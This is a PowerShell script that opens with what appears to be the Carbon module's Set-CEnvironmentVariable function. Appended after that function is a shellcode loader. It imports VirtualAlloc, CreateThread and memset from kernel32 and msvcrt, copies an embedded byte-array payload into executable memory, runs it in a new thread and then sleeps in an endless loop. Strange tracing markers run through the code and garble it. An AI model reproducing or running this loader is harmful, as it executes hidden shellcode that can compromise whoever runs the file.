
 -||-> function Set-CEnvironmentVariable
{
    
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        
        [string]$Name,
        
        [Parameter(Mandatory=$true)]
        
        [string]$Value,
        
        [Parameter(ParameterSetName='ForCurrentUser')]
        
        [Switch]$ForComputer,

        [Parameter(ParameterSetName='ForCurrentUser')]
        [Parameter(Mandatory=$true,ParameterSetName='ForSpecificUser')]
        
        [Switch]$ForUser,
        
        [Parameter(ParameterSetName='ForCurrentUser')]
        
        [Switch]$ForProcess,

        [Parameter(ParameterSetName='ForCurrentUser')]
        
        
        
        [Switch]$Force,

        [Parameter(Mandatory=$true,ParameterSetName='ForSpecificUser')]
        
        [pscredential]$Credential
    )

     -||-> Set-StrictMode -Version 'Latest' <-||- 
     -||-> Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState <-||- 

     -||-> if(  -||-> $PSCmdlet.ParameterSetName -eq 'ForSpecificUser' <-||-  )
    {
         -||-> $parameters = $PSBoundParameters <-||- 
         -||-> $parameters.Remove('Credential') <-||- 
         -||-> $job =  -||-> Start-Job -ScriptBlock {
             -||-> Import-Module -Name ( -||-> Join-Path -path $using:carbonRoot -ChildPath 'Carbon.psd1' -Resolve <-||- ) <-||- 
             -||-> $VerbosePreference = $using:VerbosePreference <-||- 
             -||-> $ErrorActionPreference = $using:ErrorActionPreference <-||- 
             -||-> $DebugPreference = $using:DebugPreference <-||- 
             -||-> $WhatIfPreference = $using:WhatIfPreference <-||- 
             -||-> Set-CEnvironmentVariable @using:parameters <-||- 
        } -Credential $Credential <-||-  <-||- 
         -||-> $job | Wait-Job | Receive-Job <-||- 
         -||-> $job | Remove-Job -Force -ErrorAction Ignore <-||- 
        return
    } <-||- 

     -||-> if(  -||-> -not $ForProcess -and -not $ForUser -and -not $ForComputer <-||-  )
    {
         -||-> Write-Error -Message ( -||-> 'Environment variable target not specified. You must supply one of the ForComputer, ForUser, or ForProcess switches.' <-||- ) <-||- 
        return
    } <-||- 

     -||-> Invoke-Command -ScriptBlock {
             -||-> if(  -||-> $ForComputer <-||-  )
            {
                 -||-> [EnvironmentVariableTarget]::Machine <-||- 
            } <-||- 

             -||-> if(  -||-> $ForUser <-||-  )
            {
                 -||-> [EnvironmentVariableTarget]::User <-||- 
            } <-||- 
            
             -||-> if(  -||-> $Force -or $ForProcess <-||-  )
            {
                 -||-> [EnvironmentVariableTarget]::Process <-||- 
            } <-||- 
        } | 
        Where-Object {  -||-> $PSCmdlet.ShouldProcess( "$_-level environment variable '$Name'", "set") <-||-  } |
        ForEach-Object {  -||-> [Environment]::SetEnvironmentVariable( $Name, $Value, $_ ) <-||-  } <-||-     
} <-||- 


 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbf,0x18,0xbc,0x8a,0x2d,0xdb,0xd3,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x57,0x31,0x7a,0x12,0x83,0xea,0xfc,0x03,0x62,0xb2,0x68,0xd8,0x6e,0x22,0xee,0x23,0x8e,0xb3,0x8f,0xaa,0x6b,0x82,0x8f,0xc9,0xf8,0xb5,0x3f,0x99,0xac,0x39,0xcb,0xcf,0x44,0xc9,0xb9,0xc7,0x6b,0x7a,0x77,0x3e,0x42,0x7b,0x24,0x02,0xc5,0xff,0x37,0x57,0x25,0xc1,0xf7,0xaa,0x24,0x06,0xe5,0x47,0x74,0xdf,0x61,0xf5,0x68,0x54,0x3f,0xc6,0x03,0x26,0xd1,0x4e,0xf0,0xff,0xd0,0x7f,0xa7,0x74,0x8b,0x5f,0x46,0x58,0xa7,0xe9,0x50,0xbd,0x82,0xa0,0xeb,0x75,0x78,0x33,0x3d,0x44,0x81,0x98,0x00,0x68,0x70,0xe0,0x45,0x4f,0x6b,0x97,0xbf,0xb3,0x16,0xa0,0x04,0xc9,0xcc,0x25,0x9e,0x69,0x86,0x9e,0x7a,0x8b,0x4b,0x78,0x09,0x87,0x20,0x0e,0x55,0x84,0xb7,0xc3,0xee,0xb0,0x3c,0xe2,0x20,0x31,0x06,0xc1,0xe4,0x19,0xdc,0x68,0xbd,0xc7,0xb3,0x95,0xdd,0xa7,0x6c,0x30,0x96,0x4a,0x78,0x49,0xf5,0x02,0x10,0x37,0x71,0xd3,0x84,0xc0,0x10,0xbd,0x3d,0x7b,0x8a,0x0d,0xc9,0xa5,0x4d,0x71,0xe0,0x9b,0x8a,0xde,0x58,0x8f,0x7f,0xb2,0x36,0x15,0x29,0x4d,0x60,0x96,0x00,0xfe,0x3d,0x03,0xa9,0x52,0x91,0xbb,0xf1,0x45,0x15,0x3c,0xe1,0xea,0x15,0x3c,0xf1,0xdd,0x4f,0x70,0xc1,0x12,0x23,0x88,0x71,0x3d,0x94,0x01,0xee,0x7b,0xe5,0xc7,0x99,0x42,0x49,0x80,0x99,0x78,0x8e,0xd4,0xca,0x2f,0x1d,0x82,0xbf,0x99,0xc9,0xc7,0x6a,0x08,0x31,0xe7,0x41,0xc2,0x2f,0x1d,0x36,0x83,0x2f,0x12,0xc8,0x53,0xb9,0xb5,0xa2,0x57,0xe9,0x5f,0x2d,0x0e,0x61,0xd5,0x17,0x30,0xf7,0xea,0x42,0x1f,0xab,0x47,0x3f,0xf6,0x23,0x45,0xb9,0xee,0xc8,0x6a,0x10,0x8b,0xef,0xe0,0x90,0xdb,0x9a,0xd3,0xcc,0x13,0xd1,0x46,0x5a,0x2b,0xcf,0xed,0x22,0xbb,0xf0,0xe1,0xa2,0x3b,0x99,0x01,0xa2,0x7b,0x59,0x51,0xca,0x23,0xfd,0x06,0xef,0x2b,0x28,0x3b,0xbc,0x80,0x5a,0xdb,0x15,0x4f,0x5d,0x04,0x99,0x8f,0x0e,0x12,0xf1,0x9d,0x26,0x13,0xe3,0x5d,0x93,0xa1,0x23,0xd5,0xd1,0x21,0xa4,0x17,0x29,0xb0,0x6a,0x62,0x48,0xe3,0xa9,0xd2,0x7a,0x61,0xd2,0x12,0x85,0xbb,0x15,0xdf,0x54,0x8d,0x53,0x27,0x87,0xdc,0xab,0x79,0xe4,0x1e <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



